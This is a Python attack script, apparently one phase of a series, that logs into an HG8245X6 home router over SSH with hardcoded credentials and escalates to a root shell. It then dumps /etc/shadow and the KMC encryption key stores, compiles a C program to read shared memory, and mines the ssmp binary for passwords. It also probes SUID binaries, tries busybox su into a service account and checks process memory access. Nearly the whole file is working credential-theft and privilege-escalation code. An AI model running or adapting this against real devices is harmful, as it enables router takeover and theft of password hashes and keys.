#!/usr/bin/env python3
"""
Phase 3: Extract ssmp hash from /etc/shadow, read KMC store and ssmp config files.
Then attempt to crack shadow hash or find plaintext via shared memory dump.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
SSMP_PID = "1650"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ "], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - KMC/Shadow/SHM Analysis & ssmp Access")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. /etc/shadow - find srv_ssmp hash ───────────────────
    print("[*] /etc/shadow (all entries):")
    send_cmd(chan, "cat /etc/shadow 2>&1")

    # ── 2. KMC store files (encryption key storage) ────────────
    print("\n[*] KMC Store A (/etc/wap/kmc_store_A):")
    send_cmd(chan, "cat /etc/wap/kmc_store_A 2>&1 | head -30")

    print("\n[*] KMC Store B (/etc/wap/kmc_store_B):")
    send_cmd(chan, "cat /etc/wap/kmc_store_B 2>&1 | head -30")

    print("\n[*] KMC Store in /mnt/jffs2:")
    send_cmd(chan, "cat /mnt/jffs2/kmc_store_A 2>&1 | head -30")
    send_cmd(chan, "cat /mnt/jffs2/kmc_store_B 2>&1 | head -30")

    # ── 3. backKey store ──────────────────────────────────────
    print("\n[*] /var/backKey/kmc_store_A:")
    send_cmd(chan, "cat /var/backKey/kmc_store_A 2>&1 | head -30")

    # ── 4. ssmp spec / feature config ─────────────────────────
    print("\n[*] SSMP spec config:")
    send_cmd(chan, "cat /etc/wap/spec/ssmp/base_ssmp_spec.cfg 2>&1 | head -40")

    # ── 5. ssmp app config ────────────────────────────────────
    print("\n[*] SSMP app config:")
    send_cmd(chan, "cat /etc/app/ssmp_app 2>&1 | head -40")

    # ── 6. Read srv_ssmp shared memory segment ─────────────────
    # shmid 131076 (key 0x0000c9af, 1572864 bytes, 27 nattch)
    print("\n[*] Reading srv_ssmp shared memory (shmid=131076):")
    # We'll use a small C program via heredoc to read the shmem
    prog = r"""cat > /tmp/rd_shm.c << 'ENDC'
#include <stdio.h>
#include <sys/shm.h>
#include <string.h>
int main() {
    int ids[] = {131076, 163845, 196614, 229383, 262152, 294921, 327690};
    int n = sizeof(ids)/sizeof(ids[0]);
    for(int i=0;i<n;i++){
        char *p = shmat(ids[i], NULL, SHM_RDONLY);
        if(p == (char*)-1) { printf("shmid %d: attach failed\n",ids[i]); continue; }
        printf("=== shmid=%d ===\n",ids[i]);
        // print printable content
        for(int j=0;j<512;j++){
            if(p[j]>=' ' && p[j]<='~') putchar(p[j]);
            else if(p[j]=='\n'||p[j]=='\r'||p[j]=='\t') putchar(p[j]);
            else putchar('.');
        }
        printf("\n");
        shmdt(p);
    }
    return 0;
}
ENDC
echo HEREDOC_OK"""
    chan.send(prog + "\n")
    out = recv_until(chan, ["HEREDOC_OK", "# "], timeout=10)
    print(f"  Heredoc: {'OK' if 'HEREDOC_OK' in out else 'FAIL'}")

    # Compile with device compiler or ARM cross
    chan.send("gcc -o /tmp/rd_shm /tmp/rd_shm.c 2>&1 || echo COMPILE_FAIL\n")
    out = recv_until(chan, ["COMPILE_FAIL", "# "], timeout=15)
    if "COMPILE_FAIL" in out or "not found" in out:
        print("  [-] gcc not on device - trying cfgtool shmem approach")
    else:
        print("  [+] Compiled rd_shm")
        send_cmd(chan, "/tmp/rd_shm 2>&1", timeout=10)

    # ── 7. ssmploaddata / ssmploadconfig ──────────────────────
    print("\n[*] /var/ssmploaddata:")
    send_cmd(chan, "cat /var/ssmploaddata 2>&1 | head -20")

    print("\n[*] /var/ssmploadconfig:")
    send_cmd(chan, "cat /var/ssmploadconfig 2>&1 | head -20")

    # ── 8. ssmp binary strings for passwords ──────────────────
    print("\n[*] Interesting strings from /bin/ssmp:")
    send_cmd(chan, r"cat /bin/ssmp | tr -cd '\11\12\15\40-\176' | grep -oE '[A-Za-z0-9_]{6,}' | sort -u | grep -iE 'pass|key|secret|admin|user|auth|login|token' | head -30", timeout=15)

    # ── 9. Check if ssmp binary has init password ─────────────
    print("\n[*] Possible credential strings in ssmp binary (8+ chars):")
    send_cmd(chan, r"cat /bin/ssmp | tr -cd '\11\12\15\40-\176' | grep -oE '\S{12,}' | grep -vE '^[0-9]+$' | sort -u | head -40", timeout=15)

    # ── 10. Try to write a setuid shell using our current root-ish access ─
    print("\n[*] Checking capabilities and SUID bits:")
    send_cmd(chan, "cat /proc/self/status | grep -E 'Cap|Uid|Gid'")
    send_cmd(chan, "find /bin /usr/bin -perm -4000 2>/dev/null | head -20", timeout=10)

    # ── 11. Try busybox su with -s flag ───────────────────────
    print("\n[*] BusyBox su with shell override:")
    send_cmd(chan, "busybox su -s /bin/sh srv_ssmp 2>&1 | head -5", timeout=8)

    # ── 12. Check ftconfig or factory password approach ────────
    print("\n[*] FT (factory test) config for ssmp:")
    send_cmd(chan, "cat /etc/wap/ft/ssmp/base_ssmp_ft.cfg 2>&1 | head -30")

    # ── 13. Check /proc/ssmp/mem directly ─────────────────────
    print(f"\n[*] Attempting direct /proc/{SSMP_PID}/mem read:")
    send_cmd(chan, f"ls -la /proc/{SSMP_PID}/mem 2>&1")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
